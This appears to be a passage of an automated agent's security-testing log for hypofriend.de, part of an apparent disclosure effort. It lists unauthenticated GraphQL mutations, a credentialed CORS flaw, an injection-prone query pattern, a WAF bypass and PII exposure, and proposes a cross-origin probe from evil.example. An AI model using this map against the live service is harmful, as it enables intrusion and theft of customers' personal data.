+- [FINAL] 3. /en/health/q & /en/plus/q auth-free execution — 74 (depends on error-class observation, no introspection)
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: report-ready — all passive gates closed this cycle (bundle re-mine + CORS live-proof 20:20–20:21Z). Hand off exact probe set: (1) benign multipart uploadDocumentExtended POST on core.hypofriend.de/en/plus/q with Origin https://evil.example reading step/error + ACAO echo; (2) processLeadForAppointment success/error class no-session; (3) property-search-api offset-walk size quantification. All three require HUMAN authorization — mutating/bulk-PII classes per program note.
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED MISCONFIG @ hypofriend.de (/q family): SPA rebuild (CbMiwoX2.js, 20:20Z) preserved entire mutation surface byte-identically — uploadDocumentExtended/processLeadForAppointment/unclaimLead/requestAccountLink/requestAppointmentLink/setNameAppointment/shareLink(self_disclosure)/rates_table/already_booked_appointments re-mined with full input types.
+- [LEARN] ACCEPTED MISCONFIG @ hypofriend.de/q: raw template-literal interpolation (no GraphQL variables) confirmed across requestAccountLink{email}, setNameAppointment{name}, fetchAppointmentCalendar{appointment_type} in fresh bundle — injection-pattern consistent, server dispatches on string.
+- [LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/en/health/q, /en/plus/q: POST 200 GraphQL live on direct origin (GET 301 is the /q-family redirect shell, not a dead endpoint) — origin WAF bypass applies to all four /q paths.
+- [LEARN] REJECTED HYPOTHESIS @ hypofriend.de/q: requestAccountLink arbitrary-email oracle — PASSIVE-not-testable, real email side-effect; excluded, HUMAN-decided.
+- [LEARN] CONFIRMED NG @ fleet sweep: property-search-api 400 both, a. 403, admin 503, api 000 — bit-identical to prior cycle.
+
+STEP 7 — RISK
+[RISK] hypofriend: 99 — CRITICAL, unchanged. SPA rebuild left the entire dangerous surface intact and verified: credentialed CORS + auth-free multipart upload / lead-creation / advisor-unclaim mutations under SameSite=None sessions on all 4 /q paths (edge+origin), full-DB PII BOLA, raw-interpolation injection pattern, origin security-header/WAF bypass. Thread scales from anonymous PII dump (property-search-api) through cross-origin victim-session document/lead manipulation. All remaining gates (bulk PII quantification, victim-session mutation PoC, report timing) are HUMAN-decided.
